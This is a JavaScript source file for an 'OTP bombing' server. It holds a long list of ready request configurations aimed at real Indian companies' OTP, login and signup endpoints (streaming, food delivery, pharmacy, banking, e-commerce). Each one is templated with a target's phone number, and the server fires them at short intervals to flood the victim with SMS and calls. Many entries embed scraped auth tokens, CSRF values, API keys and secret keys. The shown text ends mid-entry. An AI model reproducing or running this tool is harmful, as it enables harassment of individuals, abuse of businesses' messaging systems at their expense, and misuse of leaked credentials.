// ============================================================
// api_server.js - OTP Bombing API Server
// 154 Working APIs + 15 Nayi APIs + Aashu11 Real APIs
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS =====
// ============================================================

const APIS = [
    // ============================================================
    // 🆕 AASHU11 REAL APIs (from user - VERIFIED REAL)
    // ============================================================
    {
        name: "Hotstar_Aashu",
        method: "PUT",
        url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        headers: {
            "Host": "api.hotstar.com",
            "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
            "content-type": "application/json",
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
            "x-hs-appversion": "5.0.40",
            "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/subscribe/sign-in"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, country_prefix: "91" })
    },
    {
        name: "ALTBalaji_Aashu",
        method: "POST",
        url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        headers: {
            "Host": "api.cloud.altbalaji.com",
            "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
            "Content-Type": "application/json",
            "Origin": "https://www.altbalaji.com",
            "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, country_code: "91", platform: "web", exp: 1601043289127 })
    },
    {
        name: "Voot_Aashu",
        method: "POST",
        url: "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        headers: {
            "Host": "us-central1-vootdev.cloudfunctions.net",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.voot.com",
            "Referer": "https://www.voot.com/"
        },
        data: (phone) => JSON.stringify({ type: "mobile", mobile: phone, countryCode: "+91" })
    },
    {
        name: "SonyLIV_Aashu",
        method: "POST",
        url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        headers: {
            "Host": "apiv2.sonyliv.com",
            "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
            "Content-Type": "application/json",
            "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256",
            "x-via-device": "true",
            "app_version": "3.1.20",
            "Origin": "https://www.sonyliv.com",
            "Referer": "https://www.sonyliv.com/"
        },
        data: (phone) => JSON.stringify({ channelPartnerID: "MSMIND", mobileNumber: phone, country: "IN", timestamp: new Date().toISOString() })
    },
    {
        name: "MedPlus_Aashu",
        method: "POST",
        url: "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
        headers: {
            "Host": "mobile.medplusindia.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.medplusmart.com",
            "Referer": "https://www.medplusmart.com/"
        },
        data: { "_raw": "recieveUpdates=1&firstName=User&lastName=Test&emailId=test@gmail.com&password=Test%40123&confirmpwd=Test%40123&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false" }
    },
    {
        name: "Apollo247_Aashu",
        method: "POST",
        url: "https://webapi.apollo247.com/",
        headers: {
            "Host": "webapi.apollo247.com",
            "Authorization": "Bearer 3d1833da7020e0602165529446587434",
            "Content-Type": "application/json",
            "Origin": "https://www.apollo247.com",
            "Referer": "https://www.apollo247.com/"
        },
        data: (phone) => JSON.stringify({
            operationName: "Login",
            variables: { mobileNumber: "+91" + phone, loginType: "PATIENT" },
            query: "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
        })
    },
    {
        name: "NetMeds_Aashu",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "Host": "m.netmeds.com",
            "Referer": "https://m.netmeds.com/customer/account/login"
        }
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Grofers_Aashu",
        method: "POST",
        url: "https://grofers.com/v2/accounts/",
        headers: {
            "Host": "grofers.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://grofers.com",
            "Referer": "https://grofers.com/",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web"
        },
        data: { "_raw": "user_phone={phone}" }
    },
    {
        name: "Zomato_Aashu",
        method: "POST",
        url: "https://www.zomato.com/webroutes/auth/login",
        headers: {
            "Host": "www.zomato.com",
            "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
            "Content-Type": "application/json",
            "Origin": "https://www.zomato.com",
            "Referer": "https://www.zomato.com/"
        },
        data: (phone) => JSON.stringify({ country_id: 1, phone: phone, verification_type: "sms", method: "phone" })
    },
    {
        name: "Cuemath_Aashu",
        method: "POST",
        url: "https://www.cuemath.com/api/v4/parents/",
        headers: {
            "Host": "www.cuemath.com",
            "Content-Type": "application/JSON",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/"
        },
        data: (phone) => JSON.stringify({
            intl_mobile: { phone: "" },
            phone: phone,
            email: "test@test.com",
            full_name: "Test User",
            place_id: "ChIJYYhT3gl3AjoRUDlkL1i5oIk",
            timezone: "Asia/Calcutta",
            detail_source: "CMO_2020",
            form_fields: "full_name,phone,email,place_id"
        })
    },
    {
        name: "Dream11_Aashu",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "Host": "www.dream11.com",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "Content-Type": "application/json",
            "Origin": "https://www.dream11.com",
            "Referer": "https://www.dream11.com/register"
        },
        data: (phone) => JSON.stringify({
            query: "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            variables: { email: "test@gmail.com", mobileNumber: phone, password: "Test@123astronomia" }
        })
    },
    {
        name: "Doubtnut_Aashu",
        method: "POST",
        url: "https://doubtnut.com/api/v1/user/login",
        headers: {
            "Host": "doubtnut.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://doubtnut.com",
            "Referer": "https://doubtnut.com/login"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Vedantu_Aashu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "Host": "user.vedantu.com",
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/"
        },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, ver: "11.345" })
    },
    {
        name: "Unacademy_Aashu",
        method: "POST",
        url: "https://unacademy.com/api/v3/user/user_check/",
        headers: {
            "Host": "unacademy.com",
            "Authorization": "Bearer undefined",
            "Content-Type": "application/json",
            "Origin": "https://unacademy.com",
            "Referer": "https://unacademy.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "IN", otp_type: 1, email: "", send_otp: true, is_un_teach_user: false })
    },
    {
        name: "Byjus_Aashu",
        method: "POST",
        url: "https://bcas-prod.byjusweb.com/api/send-otp",
        headers: {
            "Host": "bcas-prod.byjusweb.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://byjus.com",
            "Referer": "https://byjus.com/"
        },
        data: { "_raw": "phoneNumber={phone}&page=free-trial-classes" }
    },
    {
        name: "Careers360_Aashu",
        method: "POST",
        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
        headers: {
            "Host": "www.careers360.com",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.careers360.com",
            "Referer": "https://www.careers360.com/"
        },
        data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" }
    },
    {
        name: "Coolwinks_Aashu",
        method: "GET",
        url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        headers: {
            "Host": "api.coolwinks.com",
            "Origin": "https://www.coolwinks.com",
            "Referer": "https://www.coolwinks.com/"
        }
    },
    {
        name: "CanSell_Aashu",
        method: "POST",
        url: "https://webapi.cansell.in/api/User/SignUp",
        headers: {
            "Host": "webapi.cansell.in",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://m.cansell.in",
            "Referer": "https://m.cansell.in/register"
        },
        data: (phone) => JSON.stringify({ name: "Test", surname: "User", email: "test@gmail.com", phone: phone, password: "test123" })
    },
    {
        name: "IndiaTimes_Aashu",
        method: "POST",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "Host": "jsso1.indiatimes.com",
            "Content-Type": "application/json; charset=utf-8",
            "appVersion": "8.9.0",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1"
        },
        data: (phone) => JSON.stringify({ mobile: "+91-" + phone })
    },
    {
        name: "Flipkart_Aashu",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "Host": "1.rome.api.flipkart.com",
            "Content-Type": "application/json",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/login"
        },
        data: (phone) => JSON.stringify({
            actionRequestContext: {
                type: "LOGIN_IDENTITY_VERIFY",
                loginIdPrefix: "+91",
                loginId: phone,
                clientQueryParamMap: {},
                loginType: "MOBILE",
                verificationType: "OTP",
                screenName: "LOGIN_V4_MOBILE",
                sourceContext: "DEFAULT"
            }
        })
    },
    {
        name: "Ullu_Aashu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "Host": "ullu.app",
            "Origin": "https://ullu.app",
            "Referer": "https://ullu.app/"
        }
    },
    {
        name: "Paytm_Aashu",
        method: "POST",
        url: "https://accounts.paytm.com/v2/api/register",
        headers: {
            "Host": "accounts.paytm.com",
            "Content-Type": "application/json",
            "Origin": "https://accounts.paytm.com",
            "Referer": "https://accounts.paytm.com/"
        },
        data: (phone) => JSON.stringify({
            email: "",
            mobile: phone,
            loginPassword: "Test@1090",
            csrfToken: "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
            redirectUri: "https://paytm.com/v1/api/authresponse",
            clientId: "paytm-web-secure",
            scope: "paytm",
            state: "",
            responseType: "code",
            theme: "mp-html5",
            dob_agreement: true
        })
    },
    {
        name: "Ogonn_Aashu",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "Host": "ogonn.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ogonn.in",
            "Referer": "https://ogonn.in/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "Aakash_Aashu",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "Host": "digital.aakash.ac.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://digital.aakash.ac.in",
            "Referer": "https://digital.aakash.ac.in/user/register",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "Swiggy_Aashu",
        method: "POST",
        url: "https://www.swiggy.com/mapi/auth/signup",
        headers: {
            "Host": "www.swiggy.com",
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/auth/register"
        },
        data: (phone) => JSON.stringify({ name: "Test", email: "test@gmail.com", password: "Test@123", referral_code: "", mobile: phone, _csrf: "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk" })
    },
    {
        name: "LimeRoad_Aashu",
        method: "POST",
        url: "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=&mobileOnly=false&doAction=",
        headers: {
            "Host": "www.limeroad.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.limeroad.com",
            "Referer": "https://www.limeroad.com/"
        },
        data: { "_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}" }
    },
    {
        name: "Cilory_Aashu",
        method: "POST",
        url: "https://www.cilory.com/app/w/auth/soft",
        headers: {
            "Host": "www.cilory.com",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.cilory.com",
            "Referer": "https://www.cilory.com/authentication"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "AJIO_Aashu",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "Host": "login.web.ajio.com",
            "Content-Type": "application/json",
            "Origin": "https://www.ajio.com",
            "Referer": "https://www.ajio.com/signup"
        },
        data: (phone) => JSON.stringify({
            firstName: "Test User",
            login: "test@gmail.com",
            password: "Test@1231nxnxn",
            genderType: "",
            mobileNumber: phone,
            requestType: "SENDOTP"
        })
    },
    {
        name: "BookMyShow_Aashu",
        method: "POST",
        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        headers: {
            "Host": "in.bookmyshow.com",
            "Content-Type": "application/json",
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/login/otp"
        },
        data: (phone) => JSON.stringify({ channel: "phone", subChannel: "sms", details: { phone: phone, origin: "https://in.bookmyshow.com" } })
    },
    {
        name: "BigBasket_Aashu",
        method: "POST",
        url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        headers: {
            "Host": "www.bigbasket.com",
            "Content-Type": "application/json",
            "Origin": "https://www.bigbasket.com",
            "Referer": "https://www.bigbasket.com/auth/login/",
            "x-channel": "BB-PWA"
        },
        data: (phone) => JSON.stringify({ identifier: phone })
    },
    {
        name: "FloMattress_Aashu",
        method: "POST",
        url: "https://cod.flomattress.com/api/otp",
        headers: {
            "Host": "cod.flomattress.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.flomattress.com",
            "Referer": "https://www.flomattress.com/account/register"
        },
        data: { "_raw": "number={phone}&store=hushbedding.myshopify.com" }
    },
    {
        name: "Banggood_Aashu",
        method: "POST",
        url: "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
        headers: {
            "Host": "m.banggood.in",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://m.banggood.in",
            "Referer": "https://m.banggood.in/login.html"
        },
        data: { "_raw": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu" }
    },
    {
        name: "Lenskart_Aashu",
        method: "POST",
        url: "https://api.lenskart.com/v2/customers/sendOtp",
        headers: {
            "Host": "api.lenskart.com",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/customer/account/login",
            "x-api-client": "mobilesite"
        },
        data: (phone) => JSON.stringify({ telephone: phone })
    },
    {
        name: "UrbanCompany_Aashu",
        method: "POST",
        url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        headers: {
            "Host": "www.urbanclap.com",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.urbancompany.com",
            "Referer": "https://www.urbancompany.com/",
            "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6"
        },
        data: (phone) => JSON.stringify({ country_id: "IND", phone: { isd_code: "+91", phone_wo_isd: phone }, device_type: "customer" })
    },
    {
        name: "Quikr_Aashu",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "Host": "www.quikr.com",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.quikr.com",
            "Referer": "https://www.quikr.com/SignIn"
        },
        data: { "_raw": "user={phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&v3=true" }
    },
    {
        name: "Kotak811_Aashu",
        method: "POST",
        url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&flw=vkyc",
        headers: {
            "Host": "www.kotak.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.kotak.com",
            "Referer": "https://www.kotak.com/"
        },
        data: { "_raw": "cust_full_name=Test+User&cust_email=test%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" }
    },
    {
        name: "HappyEasyGo_Aashu",
        method: "GET",
        url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}&verifycode=FDCA",
        headers: {
            "Host": "m.happyeasygo.com",
            "Referer": "https://m.happyeasygo.com/register",
            "x-device": "mobile"
        }
    },
    {
        name: "MakeMyTrip_Aashu",
        method: "POST",
        url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        headers: {
            "Host": "mapi.makemytrip.com",
            "Content-Type": "application/json",
            "Origin": "https://www.makemytrip.com",
            "Referer": "https://www.makemytrip.com/",
            "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "currency": "inr",
            "language": "eng",
            "authorization": "h4nhc9jcgpAGIjp",
            "visitor-id": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "region": "in"
        },
        data: (phone) => JSON.stringify({ loginId: phone, type: "MOBILE", version: 2, countryCode: "91" })
    },
    {
        name: "OlaCabs_Aashu",
        method: "POST",
        url: "https://accounts.olacabs.com/api/login",
        headers: {
            "Host": "accounts.olacabs.com",
            "Content-Type": "application/json",
            "Origin": "https://accounts.olacabs.com",
            "Referer": "https://accounts.olacabs.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone, dialingCode: "+91", countryCode: "IN", headers: {}, verificationId: null })
    },
    {
        name: "EasyMyTrip_Aashu",
        method: "POST",
        url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        headers: {
            "Host": "mybookings.easemytrip.com",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://mybookings.easemytrip.com",
            "Referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ emailph: "+91" + phone })
    },
    {
        name: "OYO_Aashu",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "Host": "www.oyorooms.com",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "Dominos_Aashu",
        method: "POST",
        url: "https://api.dominos.co.in/loginhandler/forgotpassword",
        headers: {
            "Host": "api.dominos.co.in",
            "Content-Type": "application/json",
            "Origin": "https://m.dominos.co.in",
            "Referer": "https://m.dominos.co.in/",
            "api_key": "d2aeb489bb8df385",
            "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp"
        },
        data: (phone) => JSON.stringify({ lastName: "", mobile: phone, firstName: "" })
    },
    {
        name: "PizzaHut_Aashu",
        method: "POST",
        url: "https://api.pizzahut.io/v1/otp/generate",
        headers: {
            "Host": "api.pizzahut.io",
            "Content-Type": "application/json; charset=utf-8",
            "Origin": "https://www.pizzahut.co.in",
            "Referer": "https://www.pizzahut.co.in/"
        },
        data: (phone) => JSON.stringify({ phone: "+91" + phone })
    },
    {
        name: "KFC_Aashu",
        method: "POST",
        url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=" + Date.now(),
        headers: {
            "Host": "online.kfc.co.in",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://online.kfc.co.in",
            "Referer": "https://online.kfc.co.in/login"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, AuthorizedFor: "3", Resend: "false" })
    },
    {
        name: "BurgerKing_Aashu",
        method: "POST",
        url: "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        headers: {
            "Host": "consumer-apis.burgerking.in",
            "Content-Type": "application/json",
            "Origin": "https://www.burgerking.in",
            "Referer": "https://www.burgerking.in/",
            "appversion": "1.6",
            "platform": "web",
            "type": "dinein"
        },
        data: (phone) => JSON.stringify({ phone_no: phone })
    },
    {
        name: "Dineout_Aashu",
        method: "POST",
        url: "https://www.dineout.co.in/xhrajaxrequest/user_signup",
        headers: {
            "Host": "www.dineout.co.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.dineout.co.in",
            "Referer": "https://www.dineout.co.in/",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "name=Test+User&email=test%40gmail.com&phone={phone}" }
    },
    {
        name: "Purplle_Aashu",
        method: "GET",
        url: "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
        headers: {
            "Host": "www.purplle.com",
            "Referer": "https://www.purplle.com/login",
            "device_id": "TEC3cjyVJhEFPGsSHw"
        }
    },
    {
        name: "AngelBroking_Aashu",
        method: "POST",
        url: "https://www.angelbroking.com/form-gateways/oda-form.php",
        headers: {
            "Host": "www.angelbroking.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.angelbroking.com",
            "Referer": "https://www.angelbroking.com/open-demat-account"
        },
        data: { "_raw": "name=Test+User&mobile={phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752" }
    },
    {
        name: "TataCliq_Aashu",
        method: "POST",
        url: "https://www.tatacliq.com/api/v1/otp/send",
        headers: {
            "Host": "www.tatacliq.com",
            "Content-Type": "application/json",
            "Origin": "https://www.tatacliq.com",
            "Referer": "https://www.tatacliq.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91" })
    },
    {
        name: "Myntra_Aashu",
        method: "POST",
        url: "https://www.myntra.com/api/auth/otp/send",
        headers: {
            "Host": "www.myntra.com",
            "Content-Type": "application/json",
            "Origin": "https://www.myntra.com",
            "Referer": "https://www.myntra.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Nykaa_Aashu",
        method: "POST",
        url: "https://www.nykaa.com/api/v1/otp/send",
        headers: {
            "Host": "www.nykaa.com",
            "Content-Type": "application/json",
            "Origin": "https://www.nykaa.com",
            "Referer": "https://www.nykaa.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "PharmEasy_Aashu",
        method: "POST",
        url: "https://api.pharmeasy.in/api/v1/otp/send",
        headers: {
            "Host": "api.pharmeasy.in",
            "Content-Type": "application/json",
            "Origin": "https://www.pharmeasy.in",
            "Referer": "https://www.pharmeasy.in/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Tata1mg_Aashu",
        method: "POST",
        url: "https://api.1mg.com/api/v1/otp/send",
        headers: {
            "Host": "api.1mg.com",
            "Content-Type": "application/json",
            "Origin": "https://www.1mg.com",
            "Referer": "https://www.1mg.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "HealthKart_Aashu",
        method: "POST",
        url: "https://www.healthkart.com/api/otp/send",
        headers: {
            "Host": "www.healthkart.com",
            "Content-Type": "application/json",
            "Origin": "https://www.healthkart.com",
            "Referer": "https://www.healthkart.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "CultFit_Aashu",
        method: "POST",
        url: "https://api.cult.fit/api/v1/otp/send",
        headers: {
            "Host": "api.cult.fit",
            "Content-Type": "application/json",
            "Origin": "https://www.cult.fit",
            "Referer": "https://www.cult.fit/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "FabIndia_Aashu",
        method: "POST",
        url: "https://www.fabindia.com/api/otp/send",
        headers: {
            "Host": "www.fabindia.com",
            "Content-Type": "application/json",
            "Origin": "https://www.fabindia.com",
            "Referer": "https://www.fabindia.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Pepperfry_Aashu",
        method: "POST",
        url: "https://www.pepperfry.com/api/otp/send",
        headers: {
            "Host": "www.pepperfry.com",
            "Content-Type": "application/json",
            "Origin": "https://www.pepperfry.com",
